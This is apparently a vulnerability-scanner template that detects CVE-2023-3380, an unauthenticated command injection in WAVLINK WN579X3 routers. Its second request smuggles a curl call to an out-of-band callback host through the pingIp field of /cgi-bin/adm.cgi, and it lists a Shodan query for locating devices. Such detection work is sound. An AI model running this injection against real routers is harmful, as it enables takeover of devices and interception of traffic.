flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    internal: true
    type: word
    words:
    - images/WAVLINK-logo.png
    - <title>Wi-Fi APP Login</title>
  method: GET
  path:
  - '{{BaseURL}}'
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /cgi-bin/adm.cgi HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Referer: {{RootURL}}/ping.shtml


    page=ping_test&CCMD=4&pingIp=255.255.255.255%3Bcurl+http%3A%2F%2F{{interactsh-url}}

    '
id: CVE-2023-3380
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:o:wavlink:wn579x3_firmware:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-3380
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-74
    epss-percentile: 0.97501
    epss-score: 0.45996
  description: 'Remote Command Execution vulnerability in WAVLINK WN579X3 routers
    via pingIp parameter in /cgi-bin/adm.cgi.

    '
  impact: 'Unauthenticated attackers can execute arbitrary commands through the pingIp
    parameter in the adm.cgi endpoint, potentially compromising the entire WAVLINK
    router and intercepting network traffic.

    '
  metadata:
    product: wn579x3_firmware
    shodan-query: http.html:"Wavlink"
    vendor: wavlink
  name: WAVLINK WN579X3 - Remote Command Execution
  reference:
  - https://github.com/sleepyvv/vul_report/blob/main/WAVLINK/WAVLINK-WN579X3-RCE.md
  - https://vuldb.com/?ctiid.232236
  - https://vuldb.com/?id.232236
  remediation: 'Update WAVLINK WN579X3 firmware to a patched version that properly
    sanitizes the pingIp parameter and prevents command injection in adm.cgi.

    '
  severity: critical
  tags: cve,cve2023,wavlink,rce,vuln
